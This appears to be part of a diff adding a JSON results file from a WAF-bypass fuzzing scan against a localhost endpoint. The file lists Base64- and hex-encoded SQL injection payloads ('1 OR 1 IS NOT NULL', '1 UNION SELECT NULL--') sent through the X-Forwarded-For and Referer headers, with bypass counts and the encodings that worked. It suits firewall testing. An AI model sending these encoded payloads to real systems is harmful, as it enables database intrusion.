+      "payload": "31204f522031204953204e4f54204e554c4c",
+      "techniques": [
+        "quote_free_strip_comment",
+        "encoding::HexEncode",
+        "vector::x-forwarded-for"
+      ],
+      "variant": 2606
+    },
+    {
+      "confidence": 0.95,
+      "payload": "MSBVTklPTiBTRUxFQ1QgTlVMTC0t",
+      "techniques": [
+        "comment_swap",
+        "encoding::Base64Encode",
+        "vector::x-forwarded-for"
+      ],
+      "variant": 2607
+    },
+    {
+      "confidence": 0.95,
+      "payload": "MSBPUiAxIElTIE5PVCBOVUxM",
+      "techniques": [
+        "quote_free_strip_comment",
+        "encoding::Base64Encode",
+        "vector::referer"
+      ],
+      "variant": 2628
+    },
+    {
+      "confidence": 0.95,
+      "payload": "31204f522031204953204e4f54204e554c4c",
+      "techniques": [
+        "quote_free_strip_comment",
+        "encoding::HexEncode",
+        "vector::referer"
+      ],
+      "variant": 2629
+    },
+    {
+      "confidence": 0.95,
+      "payload": "MSBVTklPTiBTRUxFQ1QgTlVMTC0t",
+      "techniques": [
+        "comment_swap",
+        "encoding::Base64Encode",
+        "vector::referer"
+      ],
+      "variant": 2630
+    }
+  ],
+  "bypassed": 381,
+  "elapsed_ms": 43393.164107,
+  "errors": 54,
+  "exploit_variants": 1130,
+  "explore_variants": 1539,
+  "max_retry_after_obeyed_ms": null,
+  "payload_type": "SQL Injection",
+  "rate_limited": 0,
+  "requests_completed": 2723,
+  "retry_after_responses": 0,
+  "scan_schema_version": 1,
+  "target": "http://localhost:18084/get",
+  "total_variants": 2669,
+  "waf": "Unknown",
+  "winning_strategies": [
+    "encoding::Base64Encode",
+    "encoding::HexEncode",
+    "encoding::DeflateEncode",
+    "encoding::Base64UrlEncode"
+  ]
+}
